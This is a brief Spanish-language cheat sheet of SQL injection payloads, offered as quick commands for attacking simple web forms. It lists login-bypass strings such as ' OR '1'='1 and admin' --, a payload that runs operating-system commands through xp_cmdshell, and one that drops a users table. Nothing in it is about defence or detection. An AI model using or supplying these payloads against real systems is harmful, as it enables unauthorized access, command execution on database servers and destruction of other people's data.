## Quick Start: SQL Injection Básica 💉

Este documento presenta un resumen de comandos básicos que pueden ser útiles para realizar inyecciones SQL de forma rápida en formularios simples.

## 🎯 Payloads Comunes

Los siguientes payloads funcionan en consultas básicas sin validación:

1. ' OR '1'='1
2. ' OR '1'='1' --
3. ' OR '1'='1' /* 
4. " OR "1"="1
5. " OR "1"="1" --
6. " OR "1"="1" /* 
7. '; EXEC xp_cmdshell('dir'); --
8. '; DROP TABLE users; --
9. '; SELECT * FROM users WHERE 'a'='a'; --
10. admin' --
11. admin' # 
12. admin'/* 